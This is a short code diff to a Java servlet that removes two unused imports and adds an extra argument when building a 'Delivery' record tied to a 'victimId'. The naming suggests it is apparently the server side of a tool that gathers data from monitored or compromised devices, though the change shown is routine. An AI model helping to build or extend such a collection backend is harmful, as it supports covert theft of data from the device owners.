@@ -5,11 +5,9 @@ import com.theah64.xrob.api.database.tables.Deliveries;
 import com.theah64.xrob.api.models.Delivery;
 import com.theah64.xrob.api.utils.APIResponse;
 import com.theah64.xrob.api.utils.HeaderSecurity;
-import com.theah64.xrob.api.utils.JSONUtils;
 import com.theah64.xrob.api.utils.Request;
 import org.json.JSONArray;
 import org.json.JSONException;
-import org.json.JSONObject;
 
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
@@ -48,7 +46,7 @@ public class JSONPostServlet extends BaseServlet {
             final boolean hasError = jsonPostRequest.getBooleanParameter(KEY_ERROR);
             final String message = jsonPostRequest.getStringParameter(KEY_MESSAGE);
 
-            final Delivery delivery = new Delivery(victimId, hasError, message, dataType);
+            final Delivery delivery = new Delivery(victimId, hasError, message, dataType, -1);
             final Deliveries deliveries = Deliveries.getInstance();
 
             try {
